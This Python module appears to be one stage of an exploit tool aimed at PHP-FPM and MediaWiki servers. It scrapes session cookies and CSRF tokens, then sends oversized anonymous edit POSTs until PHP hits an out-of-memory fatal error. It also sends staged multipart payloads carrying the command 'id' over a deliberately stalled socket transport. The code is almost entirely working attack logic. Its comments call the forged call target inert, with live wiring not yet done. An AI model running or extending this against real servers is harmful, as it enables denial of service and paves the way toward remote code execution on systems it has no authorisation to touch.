"""Producer stage (--step produce, and --with-producer inside --step chain).

FPM-side producers, wired from receipted ground truth only (no invented
shapes). Two producer classes:

* ``edit`` — anonymous MediaWiki edit POST driving the app-level memory_limit
  fatal *after request startup* (the hard-required FPM producer class: the
  worker must survive the fatal). The recipe (mwdb_session bootstrap ->
  api.php csrftoken scrape -> multipart POST
  ``?title=Sandbox&action=submit`` with ``wpTextbox1 = "A"*n`` and boundary
  ``----PRODBOUND123``) is copied verbatim from the receipted producer
  ``/tmp/opencode/realapps/side/php2shell/runs/run_fpmwiki_20261021_173406/producer_edit.py``
  and its ``prod/`` body ladder (2026-10-21): 3M/6M -> the 150-byte
  ``Allowed memory size ... Fatal error`` receipt; <=2M -> no fatal;
  9M -> pre-parser ``POST Content-Length exceeds the limit`` warning, i.e.
  the post_max_size ceiling, NOT a producer. MediaWiki-only shape (anon edit
  surface); other applications need their own app-level fatal producer.

* ``618`` / ``619`` — staged multipart shapes from the
  ``tool/modules/producer.py`` facade (tool/modules/producer_618.py /
  producer_619.py), sent INERT (call=0 default; no derived call target is
  wired) over the paced staged transport receipted on this lab stack
  (``/tmp/opencode/realapps/side/sender_fpm.py`` recipe: one connection,
  head + phase1, stall, tail, ``Connection: close``;
  docs/reports_realapps_validation_1021.md: wiki :28840 and wp :28841 both
  returned 200 OK with sess records created, workers alive). 619 carries CGI
  lab-jig receipts only — over HTTP FPM it is wired in but UNVERIFIED against
  a fatal outcome, hence flagged in tool/modules/profiles.py.

Receipt artifacts are written into ``<output>/<label>/``:
  edit   : ``<label>-request.bin``, ``<label>-response.bin``
  staged : ``<label>-phase1.bin``, ``<label>-tail.bin``, ``<label>-response.bin``
plus the returned summary dict (status, markers, sha256, elapsed, error).
"""

import hashlib
import http.client
import importlib.util
import json
import re
import socket
import time
from pathlib import Path

# Measured on the lab stack and shipped with COMPACT; the producer hard guard
# re-uses the same constant (9M ladder receipt: >8M turns the OOM producer
# into the pre-parser POST-size warning, which is not a producer).
try:
    from tool.modules import compact_stock_tail as _compact  # type: ignore
except (ImportError, ModuleNotFoundError):
    _compact = None


def load_compact():
    """Load the author-provided compact-stock-tail module by path (script mode)."""
    global _compact
    if _compact is not None:
        return _compact
    here = Path(__file__).resolve().parent.parent / "modules" / "compact-stock-tail.py"
    spec = importlib.util.spec_from_file_location("compact_stock_tail", here)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    _compact = module
    return _compact


POST_MAX_SIZE = 8388608  # measured (COMPACT.POST_MAX_SIZE; verified against the module below)

EDIT_BOUNDARY = b"----PRODBOUND123"  # receipted producer_edit.py boundary
EDIT_HOST_UA = "producer-run/1.0"    # receipted User-Agent of the producer run
EDIT_FIELD_NAMES = (                  # receipted field order (producer_edit.py)
    "wpTextbox1",           # set at call time: b"A" * n
    "wpEditToken",          # scraped csrftoken (api.php meta=tokens)
    "wpSummary", "wpSave", "wpStarttime", "wpEdittime", "title",
)

FATAL_MARKERS = (b"Allowed memory size", b"Fatal error")
CEILING_MARKER = b"exceeds the limit"
PRODUCING_DEFAULT_BYTES = 6_000_000  # receipted sweet spot (plan section d: 5.7-6.0M)
LADDER_STEP = 1_000_000              # one ladder retry per the validation-plan gap (d)


def _http_request(host, port, method, path, body=None, ctype=None, cookie=None,
                  host_header=None, timeout=45.0):
    """Receipted producer_edit.py request recipe (http.client, Connection: close)."""
    headers = {"Host": host_header or f"{host}:{port}",
               "User-Agent": EDIT_HOST_UA,
               "Connection": "close"}
    if cookie:
        headers["Cookie"] = cookie
    if ctype:
        headers["Content-Type"] = ctype
    connection = http.client.HTTPConnection(host, port, timeout=timeout)
    connection.request(method, path, body=body, headers=headers)
    response = connection.getresponse()
    data = response.read()
    set_cookie = response.getheader("Set-Cookie")
    connection.close()
    return response.status, data, set_cookie


def _multipart(fields: dict) -> bytes:
    boundary = EDIT_BOUNDARY
    parts = []
    for name, value in fields.items():
        parts.append(
            b"--" + boundary + b"\r\nContent-Disposition: form-data; name=\""
            + name.encode() + b"\"\r\n\r\n" + value + b"\r\n"
        )
    parts.append(b"--" + boundary + b"--\r\n")
    return b"".join(parts)


def _markers(body: bytes) -> dict:
    out = {}
    for marker in (b"Allowed memory", b"Fatal error", b"Unknown on line 0",
                   b"exceeds the limit", b"errorbox", b"MediaWiki"):
        index = body.find(marker)
        if index >= 0:
            out[marker.decode("latin1")] = index
    return out


def produce_edit(host, port, path, host_header, timeout, output, label="producer",
                 text_bytes=PRODUCING_DEFAULT_BYTES, ladder_retries: int = 1) -> dict:
    """MediaWiki anon-edit OOM producer (receipted ground truth; copied verbatim)."""
    compact = load_compact()
    post_max = getattr(compact, "POST_MAX_SIZE", POST_MAX_SIZE)
    base = output / label
    base.mkdir(parents=True, exist_ok=True)
    keyword_ext = "&" if "?" in path else "?"
    started = time.monotonic()
    summary: dict = {
        "producer": "edit",
        "label": label,
        "host": host,
        "port": port,
        "path": path,
    }
    # hard guard (receipt: 9M = pre-parser POST-size warning, never a producer)
    if text_bytes + 4096 >= post_max:
        summary["error"] = (f"producer body would exceed the measured post_max_size "
                            f"budget {post_max} (9M ladder receipt: pre-parser warning, "
                            f"not an OOM producer)")
        return summary

    attempts = []
    keyword_ext = "&" if "?" in path else "?"
    n = text_bytes
    # 1+2. bootstrap anon session cookie + csrf token scrape, once, receipted
    # recipe (producer_edit.py steps 1-2); the ladder re-uses them.
    cookie = None
    token = ""
    rec_pre: dict = {}
    try:
        status, data, set_cookie = _http_request(
            host, port, "GET", f"{path}{keyword_ext}title=Main_Page",
            host_header=host_header, timeout=timeout)
        match = re.search(r"mwdb_session=([A-Za-z0-9]+)", set_cookie or "")
        cookie = f"mwdb_session={match.group(1)}" if match else None
        (base / f"{label}-bootstrap.bin").write_bytes(data)
        rec_pre["bootstrap"] = {"status": status, "cookie": bool(cookie)}
        status, data, _ = _http_request(
            host, port, "GET", "/api.php?action=query&meta=tokens&format=json",
            cookie=cookie, host_header=host_header, timeout=timeout)
        try:
            token = json.loads(data)["query"]["tokens"]["csrftoken"]
        except (ValueError, KeyError, TypeError) as exc:
            token = ""
            rec_pre["token_error"] = f"{type(exc).__name__}: {exc}"
        (base / f"{label}-token.json").write_bytes(data)
        rec_pre["token"] = bool(token)
    except (OSError, TimeoutError, http.client.HTTPException) as exc:
        rec_pre["error"] = f"{type(exc).__name__}: {exc}"
        return {**summary, **rec_pre}
    summary.update(rec_pre)
    for try_index in range(1 + max(0, ladder_retries)):
        label_try = label if try_index == 0 else f"{label}-L{n // 1_000_000}M"
        # receipted field set (producer_edit.py; static wp*date stamp intact)
        fields = {
            "wpTextbox1": b"A" * n,
            "wpEditToken": token.encode(),
            "wpSummary": b"producer",
            "wpSave": b"Save page",
            "wpStarttime": b"20261021000000",
            "wpEdittime": b"20261021000000",
            "title": b"Sandbox",
        }
        body = _multipart(fields)
        (base / f"{label_try}-request.bin").write_bytes(body)
        rec: dict = {"text_bytes": n, "request_bytes": len(body)}
        data = b""  # last response bytes; stays empty when an exchange raises
        try:
            # 3. the anon edit POST itself (receipted recipe)
            status, data, _ = _http_request(
                host, port, "POST", f"{path}{keyword_ext}title=Sandbox&action=submit",
                body=body, ctype=f"multipart/form-data; boundary={EDIT_BOUNDARY.decode()}",
                cookie=cookie, host_header=host_header, timeout=timeout)
            rec["status"] = status
            rec["body_bytes"] = len(data)
            rec["body_sha256"] = hashlib.sha256(data).hexdigest()
            rec["markers"] = _markers(data)
            rec["fatal"] = b"Allowed memory size" in data and b"Fatal error" in data
            rec["post_size_ceiling"] = CEILING_MARKER in data
        except (OSError, TimeoutError, http.client.HTTPException) as exc:
            rec["error"] = f"{type(exc).__name__}: {exc}"
            rec["status"] = None
        (base / f"{label_try}-response.bin").write_bytes(data)
        attempts.append(rec)
        summary[label_try] = rec
        if rec.get("fatal"):
            break
        if rec.get("post_size_ceiling"):
            break
        n = n - LADDER_STEP
        if n <= 0:
            break
    final = attempts[-1]
    summary["fatal"] = bool(final.get("fatal"))
    summary["post_size_ceiling"] = bool(final.get("post_size_ceiling"))
    summary["attempts"] = len(attempts)
    summary["elapsed"] = round(time.monotonic() - started, 3)
    summary["artifacts"] = str(base)
    return summary


def produce_staged(kind: str, host, port, path, host_header, timeout, output,
                   label="producer", sid=None, stall=1.35, session_save_path=None) -> dict:
    """Staged 618/619 producer over the receipted paced transport (inert call=0).

    Transport copied verbatim from /tmp/opencode/realapps/side/sender_fpm.py
    (the sender receipted against this lab stack). Bodies come from the
    tool/modules/producer.py facade; forge stays inert (call=0) — a live
    forged call target is NOT wired here (needs a derived address; TODO).
    """
    # receipts for this transport: both wiki (28840) and wp (28841) returned
    # 200 OK with sess records created and workers alive (validation report)
    leaned = kind.strip()
    if leaned == "618":
        from tool.modules import producer_618 as module
    elif leaned == "619":
        from tool.modules import producer_619 as module
    else:
        raise ValueError(f"unknown staged producer kind {kind!r}; expected 618 or 619")
    stamp = time.strftime("%y%m%d%H%M%S", time.gmtime())
    sid = sid or f"poc{leaned}drv{stamp}"[:32].replace("-", "x")
    command = b"id"
    phase1, tail = module.build(sid, command, 0)
    base = output / label
    base.mkdir(parents=True, exist_ok=True)
    (base / f"{label}-phase1.bin").write_bytes(phase1)
    (base / f"{label}-tail.bin").write_bytes(tail)

    boundary = getattr(module, "BOUND", f"B7kQpoc{leaned}").decode()
    body_len = len(phase1) + len(tail)
    head = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host_header or f'{host}:{port}'}\r\n"
        f"User-Agent: staged-poc{leaned}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {body_len}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    started = time.monotonic()
    summary: dict = {
        "producer": f"staged-{leaned}",
        "inert": True,          # call=0 forge; live call target not wired
        "sid": sid,
        "stall_seconds": stall,
        "phase1_bytes": len(phase1),
        "tail_bytes": len(tail),
        "host": host,
        "port": port,
        "path": path,
    }
    response = b""
    error = None
    connection = None
    try:
        connection = socket.create_connection((host, port), timeout=timeout)
        connection.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        connection.sendall(head + phase1)  # phase1 first, receipted pacing
        time.sleep(stall)
        connection.sendall(tail)
        connection.settimeout(timeout)
        chunks = []
        while True:
            try:
                data = connection.recv(65536)
            except (socket.timeout, TimeoutError):
                break
            if not data:
                break
            chunks.append(data)
        response = b"".join(chunks)
    except (OSError, TimeoutError) as exc:
        error = f"{type(exc).__name__}: {exc}"
    finally:
        if connection is not None:
            try:
                connection.close()
            except OSError:
                pass
    summary["elapsed"] = round(time.monotonic() - started, 3)
    (base / f"{label}-response.bin").write_bytes(response)
    status_line = response.split(b"\r\n", 1)[0] if response else b""
    m = re.match(rb"HTTP/1\.[01] ([0-9]{3})", status_line)
    summary["status"] = int(m.group(1)) if m else None
    summary["response_bytes"] = len(response)
    if error:
        summary["error"] = error
    if session_save_path:
        record = Path(session_save_path) / f"sess_{sid}"
        summary["sess_record"] = {
            "path": str(record),
            "exists": record.exists(),
            "bytes": record.stat().st_size if record.exists() else 0,
        }
    return summary


def run_producer(kind, host, port, path, host_header, timeout, output, *,
                 label="producer", text_bytes=PRODUCING_DEFAULT_BYTES,
                 ladder_retries=1, sid=None, stall=1.35,
                 session_save_path=None) -> dict:
    """Dispatch one producer invocation; returns its receipt summary."""
    if kind == "edit":
        return produce_edit(host, port, path, host_header, timeout, output,
                            label=label, text_bytes=text_bytes,
                            ladder_retries=ladder_retries)
    if kind in ("618", "619"):
        return produce_staged(kind, host, port, path, host_header, timeout, output,
                              label=label, sid=sid, stall=stall,
                              session_save_path=session_save_path)
    raise ValueError(f"unknown producer kind {kind!r}; expected edit, 618 or 619")
